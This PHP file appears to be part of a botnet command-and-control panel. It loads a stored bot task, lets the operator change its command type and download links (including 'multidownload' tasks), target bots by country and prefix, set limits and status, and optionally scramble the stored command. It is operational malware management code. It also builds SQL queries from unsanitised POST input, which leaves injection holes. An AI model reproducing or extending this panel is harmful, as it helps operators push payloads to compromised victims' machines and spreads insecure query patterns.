<?php
//error_reporting(-1);
$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

get_function('rc');

function str2db($str){
	global $config, $rc;	
	if($config['scramb'] == 1){
		return rc_encode($str);
	}else{
		return $str;
	}
}

function db2str($str){
	global $config, $rc;
	if($config['scramb'] == 1){
		return rc_decode($str);
	}else{
		return $str;
	}
}

if(!empty($Cur['id'])){
	$cmd = $mysqli->query('SELECT * FROM bf_cmds WHERE (id = \''.$Cur['id'].'\') LIMIT 1');

	if($cmd->id == $Cur['id']){
		if($config['scramb'] == 1){
			$cmd->cmd = db2str($cmd->cmd);
			//$cmd->cmd = $cmd->cmd . ' ' . md5($cmd->cmd);
		}

		if(!isset($_POST['country'])){
			if($cmd->country != '*'){
				$_POST['country'] = explode('|', rtrim($cmd->country, '|'));
			}else{
				$_POST['country'] = '*';
			}
		}
        $cset = array_flip($_POST['country']);
		$smarty->assign("cset", $cset);

		if(!isset($_POST['prefix'])){
			if($cmd->prefix != '*'){
				$_POST['prefix'] = explode('|', rtrim($cmd->prefix, '|'));
			}else{
				$_POST['prefix'] = '*';
			}
		}
        $pset = array_flip($_POST['prefix']);
		$smarty->assign("pset", $pset);

		if(!isset($_POST['limit'])){
			$_POST['limit'] = $cmd->max;
		}

		$cmd->type = explode(' ', $cmd->cmd, 2);

		if(count($cmd->type) == 2){
			if(!empty($_POST['link'])){
				$cmd->link = $_POST['link'];
			}else{
				$cmd->link = $cmd->type[1];
			}
			$cmd->type = $cmd->type[0];

			if($cmd->type == 'multidownload'){
				//$cmd->link = rtrim(str_replace('|', ' ', $cmd->link));
			}

		}elseif(count($cmd->type) == 1){
			$cmd->type = $cmd->type[0];
			$cmd->link = false;
		}

		//print_rm($cmd);

		if($_POST['submit']){
			$time = time();

			if(!empty($_POST['country'][0]) && $_POST['country'][0] != '*'){
				$country = implode('|', $_POST['country']) . '|';
			}else{
				$country = '*';
			}

			if(!empty($_POST['prefix'][0]) && $_POST['prefix'][0] != '*'){
				$prefix = implode('|', $_POST['prefix']) . '|';
			}else{
				if(!empty($_SESSION['user']->config['prefix'])){
					$prefix = $_SESSION['user']->config['prefix'];
				}else{
					$prefix = '*';
				}
			}

			if(!empty($cmd->link)){				
				if($cmd->type == 'multidownload'){
					if(function_exists('save_history_log')){
						thl('Action: Edit task (multidownload)');
						thl('Task ID: ' . $cmd->id);
						thl('CMD: ' . $cmd->type . ' ' . str_replace(' ', '|', trim($_POST['link'])));
						save_history_log();
					}
					
					$mysqli->query('update bf_cmds set cmd = \''.str2db($cmd->type.' '.str_replace(' ', '|', trim($_POST['link'])).'|').'\', max = \''.$_POST['limit'].'\', country = \''.$country.'\', prefix = \''.$prefix.'\', online = \''.$_POST['status'].'\' WHERE (id = \''.$cmd->id.'\')');
				}else{
					if(function_exists('save_history_log')){
						thl('Action: Edit task');
						thl('Task ID: ' . $cmd->id);
						thl('CMD: ' . $cmd->type.' '.$_POST['link']);
						save_history_log();
					}
					
					$mysqli->query('update bf_cmds set cmd = \''.str2db($cmd->type.' '.$_POST['link']).'\', max = \''.$_POST['limit'].'\', country = \''.$country.'\', prefix = \''.$prefix.'\', online = \''.$_POST['status'].'\' WHERE (id = \''.$cmd->id.'\')');
				}
			}else{				
				if(function_exists('save_history_log')){
					thl('Action: Edit task (Type)');
					thl('Task ID: ' . $cmd->id);
					thl('CMD: ' . $cmd->type);
					save_history_log();
				}
				
				$mysqli->query('update bf_cmds set cmd = \''.str2db($cmd->type).'\', max = \''.$_POST['limit'].'\', country = \''.$country.'\', prefix = \''.$prefix.'\', online = \''.$_POST['status'].'\' WHERE (id = \''.$cmd->id.'\')');
			}
			
			print('<script language="javascript" type="application/javascript">window_close(document.getElementById(\'div_sub_'.($smarty->tpl_vars['rand_name']->value).'\').parentNode.id.replace(\'_content\', \'_wid\'), 1); get_hax({url: \'/bots/jobs.html?ajax=1\', id: \'content\'});</script>');
		}

		include_once('modules/bots/country_code.php');
		$smarty->assign('country_code', $country_code);

		$country = $mysqli->query_cache('SELECT code FROM bf_country ORDER by code ASC', null, 3600);
		$smarty->assign('country', $country);

		$prefix = scandir('cache/prefix/', false);
		unset($prefix[0], $prefix[1]);
		$smarty->assign("prefix", $prefix);

		$smarty->assign("cmd", $cmd);
	}else{
		print_r('Error!');
		exit;
	}
}else{
	print_r('Error!');
	exit;
}

?>